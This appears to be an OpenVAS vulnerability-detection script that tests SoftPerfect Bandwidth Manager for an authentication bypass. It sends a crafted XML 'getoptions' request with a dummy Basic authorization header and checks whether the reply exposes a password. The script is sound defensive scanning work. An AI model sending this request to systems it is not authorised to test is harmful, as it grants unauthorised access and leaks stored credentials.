###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_softperfect_bandwidth_manager_54182.nasl 8649 2018-02-03 12:16:43Z teissa $
#
# SoftPerfect Bandwidth Manager Authentication Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "SoftPerfect Bandwidth Manager is prone to an authentication-bypass
vulnerability.

An attacker can exploit this issue to bypass the authentication
process and gain unauthorized access to the affected system.

SoftPerfect Bandwidth Manager 2.9.10 is vulnerable; other versions
may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103500");
 script_bugtraq_id(54182);
 script_version ("$Revision: 8649 $");

 script_name("SoftPerfect Bandwidth Manager Authentication Bypass Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54182");

 script_tag(name:"last_modification", value:"$Date: 2018-02-03 13:16:43 +0100 (Sat, 03 Feb 2018) $");
 script_tag(name:"creation_date", value:"2012-06-26 11:12:35 +0200 (Tue, 26 Jun 2012)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 8701);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8701);
if(!get_port_state(port))exit(0);

req = string("POST / HTTP/1.0\r\n",
             "Content-Type: text/xml\r\n",
             "Content-Length: 1\r\n\r\n");

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("Authorization header required" >!< result)exit(0);

xml = '<?xml version="1.0" encoding="windows-1252"?>
<request>
    <command>getoptions</command>
</request>';

req = string("POST / HTTP/1.0\r\n",
             "Content-Type: text/xml\r\n",
             "Content-Length: ",strlen(xml),"\r\n",
             "Authorization: Basic AAAA\r\n",
             "\r\n",
             xml);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("<status>OK</status>" >< result) {

  if(result =~ "<password>[^<]+</password>") {
    security_message(port:port);
    exit(0);
  }  
}

exit(0);  
